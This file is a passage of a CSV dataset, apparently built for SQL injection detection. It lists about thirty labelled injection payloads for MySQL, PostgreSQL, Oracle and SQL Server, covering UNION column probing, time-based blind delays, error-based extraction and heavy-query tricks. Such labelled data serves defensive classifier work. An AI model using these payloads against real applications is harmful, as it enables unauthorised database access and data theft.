row_index,payload_norm,label,sqli_type_hint
1320,"1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1321,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,
1322,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",1,
1323,1 ) where 2232 = 2232,1,
1324,"-3637"" or ( 8459 = 8459 ) *4906",1,
1325,1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
1326,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
1327,"iif ( 2452 = 8999,1,1/0 )",1,
1328,1' ) as bihs where 4197 = 4197,1,
1329,"-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--",1,
1330,"1 ) ) ) union all select null,null,null,null,null,null--",1,
1331,"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",1,
1332,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
1333,1'|| ( select 'fwph' where 3791 = 3791,1,
1334,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",1,
1335,-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202,1,
1336,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,1,
1337,"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
1338,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",1,
1339,1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,
1340,"select sleep ( 5 ) and ""cyrb"" = ""cyrb",1,
1341,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'jhlj' = 'jhlj,1,
1342,1 ) as oknr where 3228 = 3228,1,
1343,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",1,
1344,"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",1,
1345,"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",1,
1346,"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#",1,
1347,"1 ) ) ) union all select null,null,null,null,null,null,null--",1,
1348,"1"" union all select null,null,null,null--",1,
1349,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",1,
